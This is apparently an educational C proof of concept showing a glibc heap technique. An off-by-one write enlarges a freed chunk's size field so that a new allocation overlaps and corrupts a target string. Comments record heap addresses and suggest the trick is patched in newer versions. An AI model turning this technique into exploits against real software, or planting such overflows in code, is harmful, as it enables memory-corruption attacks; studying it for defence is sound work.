#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(){
  void *V = malloc(0x18); // vulnerable object
  void *A = malloc(0xf0); // chunk size 0x100, not fastbin
  char *T = (char*)malloc(0x10); // target
  strcpy(T, "Target");
  printf("T: %s\n", T);
  free(A);
  memcpy(V, "AAAAAAAAAAAAAAAAAAAAAAAA\x21",0x19); // off-by-one, enlarge sizeof A to 0x120
  char *B = (char*)malloc(0x110);  //malloc B overlapping T
  strcpy(B+0x100, "Corrupted!"); // corrupt T
  printf("T: %s\n", T);
  return 0;
}

// heap entry: 0x0000555555756000
// V entry: 0x555555756260
// A entry: 0x555555756280 
// T entry: 0x555555756380

// B entry: 0x5555557567b0 (?) New Version patched
